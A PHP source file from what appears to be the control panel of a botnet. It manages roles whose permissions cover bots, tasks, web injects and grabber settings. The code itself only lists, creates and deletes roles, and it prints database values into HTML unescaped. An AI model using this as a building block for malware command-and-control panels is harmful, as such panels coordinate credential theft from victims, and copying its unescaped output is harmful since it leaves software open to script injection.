<?php

class Model_Roles_CP extends Model
{
    public function getRoles()
    {
        $roles_info = $this->getDB()->queryRows('SELECT * FROM `roles_list`');
        if (!empty($roles_info)) {
            foreach ($roles_info as $roles_list => $value) {
                echo '<tr>';
                echo '<td>' . $value['id'] . '</td>';
                echo '<td>' . $value['name_role'] . '</td>';
                echo '<td>' . $value['list_access'] . '</td>';
                echo '<td><center><a href="/role?role_id=' . $value['id'] . '"><i style="cursor: pointer;" class="fa fa-edit fa-lg text-success"></i></a></center></td>';
                echo '<td><center><i style="cursor: pointer;" class="fa fa-trash-o fa-lg text-danger" onclick="deleteRole(' . $value['id'] . ')"></i></center></td>';
                echo '</tr>';
            }
        }
    }

    public function deleteRole()
    {
        if (!empty($this->request_data['role_id'])) {
            $id = $this->request_data['role_id'];

            $this->getDB()->sql("DELETE FROM `roles_list` WHERE `id`=:id", array(':id' => $id));
            return true;
        } else {
            return false;
        }
    }

    public function CreateRole()
    {
        if ($this->roleInfoIsCorrect()) {
            $new_role_name = $this->request_data['new_role_name'];

            if (empty($this->request_data['access_all'])) {
                $access_all = "DISALLOW_ALL";
            } else {
                $access_all = $this->request_data['access_all'];
            }

            if (empty($this->request_data['access_users_cp'])) {
                $access_users_cp = "DISALLOW_USERS_CP";
            } else {
                $access_users_cp = $this->request_data['access_users_cp'];
            }

            if (empty($this->request_data['access_bots'])) {
                $access_bots = "DISALLOW_BOTS";
            } else {
                $access_bots = $this->request_data['access_bots'];
            }

            if (empty($this->request_data['access_task_cp'])) {
                $access_task_cp = "DISALLOW_TASK_CP";
            } else {
                $access_task_cp = $this->request_data['access_task_cp'];
            }

            if (empty($this->request_data['access_web_inj_cp'])) {
                $access_web_inj_cp = "DISALLOW_WEB_INJ_CP";
            } else {
                $access_web_inj_cp = $this->request_data['access_web_inj_cp'];
            }

            if (empty($this->request_data['access_grabber_settings_cp'])) {
                $access_grabber_settings_cp = "DISALLOW_GRABBER_SETTINGS_CP";
            } else {
                $access_grabber_settings_cp = $this->request_data['access_grabber_settings_cp'];
            }

            $list_access = $access_all . ',' . $access_users_cp . ',' . $access_bots . ',' . $access_task_cp . ',' . $access_web_inj_cp . ',' . $access_grabber_settings_cp;

            $add_new_role = $this->getDB()->insert('roles_list', array('name_role' => "$new_role_name", 'list_access' => "$list_access"));
            if ($add_new_role > 0) {
                return true;
            }
            return false;
        }
        return false;
    }

    private function roleInfoIsCorrect()
    {
        if (!empty($this->request_data['new_role_name'])) {
            return true;
        } else {
            return false;
        }
    }
}

?>